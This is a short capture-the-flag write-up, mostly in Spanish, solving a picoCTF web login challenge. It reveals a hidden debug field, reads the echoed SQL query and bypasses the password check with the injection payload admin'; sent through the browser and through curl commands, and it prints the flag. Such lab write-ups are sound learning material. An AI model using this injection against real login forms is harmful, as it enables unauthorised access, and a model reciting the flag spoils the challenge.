## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

Hint
- The password is being filtered.
## Solucion
Utilizamos el inspector para mostrar el campo oculto.
```html
<input type="show" name="debug" value="1">
```
Obtenemos la como se hace la consulta sql.
```sql 
username: admin
password: 
SQL query: SELECT * FROM users WHERE name='admin' AND password=''
```
Hacemos una inyeccion que se veria de esta manera.
```sql
username: admin';
password: 
SQL query: SELECT * FROM users WHERE name='admin';' AND password=''
```
Y obtenmos la bandera.
Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
## Solucion 2.
```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin&passsword=h&debug=1"
<pre>username: admin
password:
SQL query: SELECT * FROM users WHERE name='admin' AND password=''
</pre><h1>Login failed.</h1>
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';&passsword=h&debug=1"
<pre>username: admin';
password:
SQL query: SELECT * FROM users WHERE name='admin';' AND password=''
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$

```
## Notas adicionales
## Referencias